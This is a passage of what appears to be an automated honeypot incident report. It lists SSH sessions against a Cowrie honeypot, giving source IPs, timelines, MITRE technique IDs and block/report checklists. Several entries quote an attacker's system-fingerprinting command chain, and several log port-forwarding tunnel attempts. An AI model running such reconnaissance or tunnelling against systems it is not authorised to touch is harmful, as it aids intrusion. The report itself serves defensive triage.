- [ ] Block `27.79.43[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1727010d2ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:45 |
| **Last Seen** | 2026-08-16 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:45:01` | `cowrie.session.connect` |
| `2026-08-16 17:45:01` | `cowrie.client.version` |
| `2026-08-16 17:45:01` | `cowrie.client.kex` |
| `2026-08-16 17:45:02` | `cowrie.login.success` |
| `2026-08-16 17:45:03` | `cowrie.session.params` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.success` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.command.input` |
| `2026-08-16 17:45:03` | `cowrie.log.closed` |
| `2026-08-16 17:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1203ec07ec7b

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-16 17:45 |
| **Last Seen** | 2026-08-16 17:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:45:30` | `cowrie.session.connect` |
| `2026-08-16 17:45:31` | `cowrie.client.version` |
| `2026-08-16 17:45:31` | `cowrie.client.kex` |
| `2026-08-16 17:45:33` | `cowrie.login.success` |
| `2026-08-16 17:45:34` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b79ab547c33

| Field | Detail |
|---|---|
| **Source IP** | `27.79.43[.]66` |
| **First Seen** | 2026-08-16 17:45 |
| **Last Seen** | 2026-08-16 17:48 |
| **Session Duration** | 193s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:45:32` | `cowrie.session.connect` |
| `2026-08-16 17:45:32` | `cowrie.client.version` |
| `2026-08-16 17:45:32` | `cowrie.client.kex` |
| `2026-08-16 17:45:52` | `cowrie.login.success` |
| `2026-08-16 17:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.43[.]66` to AbuseIPDB if not already reported
- [ ] Block `27.79.43[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bfc7319980e

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-08-16 17:45 |
| **Last Seen** | 2026-08-16 17:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:45:39` | `cowrie.session.connect` |
| `2026-08-16 17:45:39` | `cowrie.client.version` |
| `2026-08-16 17:45:39` | `cowrie.client.kex` |
| `2026-08-16 17:45:40` | `cowrie.login.success` |
| `2026-08-16 17:45:40` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636695fb83b9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:47 |
| **Last Seen** | 2026-08-16 17:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:47:09` | `cowrie.session.connect` |
| `2026-08-16 17:47:09` | `cowrie.client.version` |
| `2026-08-16 17:47:09` | `cowrie.client.kex` |
| `2026-08-16 17:47:10` | `cowrie.login.success` |
| `2026-08-16 17:47:12` | `cowrie.session.params` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.success` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.command.input` |
| `2026-08-16 17:47:12` | `cowrie.log.closed` |
| `2026-08-16 17:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde21f96cc7c

| Field | Detail |
|---|---|
| **Source IP** | `27.79.43[.]66` |
| **First Seen** | 2026-08-16 17:47 |
| **Last Seen** | 2026-08-16 17:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:47:36` | `cowrie.session.connect` |
| `2026-08-16 17:47:36` | `cowrie.client.version` |
| `2026-08-16 17:47:36` | `cowrie.client.kex` |
| `2026-08-16 17:47:39` | `cowrie.login.success` |
| `2026-08-16 17:47:39` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:47:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:47:40` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.43[.]66` to AbuseIPDB if not already reported
- [ ] Block `27.79.43[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab69fed37a45

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:49 |
| **Last Seen** | 2026-08-16 17:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:49:16` | `cowrie.session.connect` |
| `2026-08-16 17:49:16` | `cowrie.client.version` |
| `2026-08-16 17:49:16` | `cowrie.client.kex` |
| `2026-08-16 17:49:17` | `cowrie.login.success` |
| `2026-08-16 17:49:18` | `cowrie.session.params` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.success` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:18` | `cowrie.command.input` |
| `2026-08-16 17:49:19` | `cowrie.log.closed` |
| `2026-08-16 17:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34bfc9e43ed3

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:50 |
| **Last Seen** | 2026-08-16 17:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:50:44` | `cowrie.session.connect` |
| `2026-08-16 17:50:44` | `cowrie.client.version` |
| `2026-08-16 17:50:45` | `cowrie.client.kex` |
| `2026-08-16 17:50:47` | `cowrie.login.success` |
| `2026-08-16 17:50:47` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:50:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:50:47` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93908a3b37fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:51 |
| **Last Seen** | 2026-08-16 17:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:51:14` | `cowrie.session.connect` |
| `2026-08-16 17:51:14` | `cowrie.client.version` |
| `2026-08-16 17:51:14` | `cowrie.client.kex` |
| `2026-08-16 17:51:15` | `cowrie.login.success` |
| `2026-08-16 17:51:17` | `cowrie.session.params` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.success` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.command.input` |
| `2026-08-16 17:51:17` | `cowrie.log.closed` |
| `2026-08-16 17:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6f77d27c2f

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 17:51 |
| **Last Seen** | 2026-08-16 17:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:51:32` | `cowrie.session.connect` |
| `2026-08-16 17:51:32` | `cowrie.client.version` |
| `2026-08-16 17:51:32` | `cowrie.client.kex` |
| `2026-08-16 17:51:33` | `cowrie.login.success` |
| `2026-08-16 17:51:34` | `cowrie.session.params` |
| `2026-08-16 17:51:34` | `cowrie.command.input` |
| `2026-08-16 17:51:34` | `cowrie.log.closed` |
| `2026-08-16 17:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2277c7d1359

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:53 |
| **Last Seen** | 2026-08-16 17:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:53:02` | `cowrie.session.connect` |
| `2026-08-16 17:53:02` | `cowrie.client.version` |
| `2026-08-16 17:53:03` | `cowrie.client.kex` |
| `2026-08-16 17:53:05` | `cowrie.login.success` |
| `2026-08-16 17:53:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:53:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:53:06` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a212fef537

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:53 |
| **Last Seen** | 2026-08-16 17:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:53:06` | `cowrie.session.connect` |
| `2026-08-16 17:53:06` | `cowrie.client.version` |
| `2026-08-16 17:53:06` | `cowrie.client.kex` |
| `2026-08-16 17:53:08` | `cowrie.login.success` |
| `2026-08-16 17:53:10` | `cowrie.session.params` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.success` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:10` | `cowrie.command.input` |
| `2026-08-16 17:53:11` | `cowrie.log.closed` |
| `2026-08-16 17:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8d49d7bd2b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:54 |
| **Last Seen** | 2026-08-16 17:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:54:53` | `cowrie.session.connect` |
| `2026-08-16 17:54:53` | `cowrie.client.version` |
| `2026-08-16 17:54:53` | `cowrie.client.kex` |
| `2026-08-16 17:54:55` | `cowrie.login.success` |
| `2026-08-16 17:54:57` | `cowrie.session.params` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.success` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:57` | `cowrie.command.input` |
| `2026-08-16 17:54:58` | `cowrie.log.closed` |
| `2026-08-16 17:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1cdf00f4ec

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:56 |
| **Last Seen** | 2026-08-16 17:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:56:19` | `cowrie.session.connect` |
| `2026-08-16 17:56:19` | `cowrie.client.version` |
| `2026-08-16 17:56:19` | `cowrie.client.kex` |
| `2026-08-16 17:56:25` | `cowrie.login.success` |
| `2026-08-16 17:56:26` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:56:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:56:27` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-166ac9bd5078

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:56 |
| **Last Seen** | 2026-08-16 17:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:56:43` | `cowrie.session.connect` |
| `2026-08-16 17:56:43` | `cowrie.client.version` |
| `2026-08-16 17:56:43` | `cowrie.client.kex` |
| `2026-08-16 17:56:45` | `cowrie.login.success` |
| `2026-08-16 17:56:46` | `cowrie.session.params` |
| `2026-08-16 17:56:46` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.success` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:47` | `cowrie.command.input` |
| `2026-08-16 17:56:48` | `cowrie.log.closed` |
| `2026-08-16 17:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f875280d92

| Field | Detail |
|---|---|
| **Source IP** | `27.79.43[.]66` |
| **First Seen** | 2026-08-16 17:56 |
| **Last Seen** | 2026-08-16 17:59 |
| **Session Duration** | 138s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:56:47` | `cowrie.session.connect` |
| `2026-08-16 17:56:54` | `cowrie.client.version` |
| `2026-08-16 17:57:31` | `cowrie.client.kex` |
| `2026-08-16 17:57:38` | `cowrie.login.success` |
| `2026-08-16 17:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.43[.]66` to AbuseIPDB if not already reported
- [ ] Block `27.79.43[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da9f5750bcef

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-08-16 17:58 |
| **Last Seen** | 2026-08-16 17:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:58:32` | `cowrie.session.connect` |
| `2026-08-16 17:58:33` | `cowrie.client.version` |
| `2026-08-16 17:58:33` | `cowrie.client.kex` |
| `2026-08-16 17:58:36` | `cowrie.login.success` |
| `2026-08-16 17:58:37` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c2fcc1a31a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:58 |
| **Last Seen** | 2026-08-16 17:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
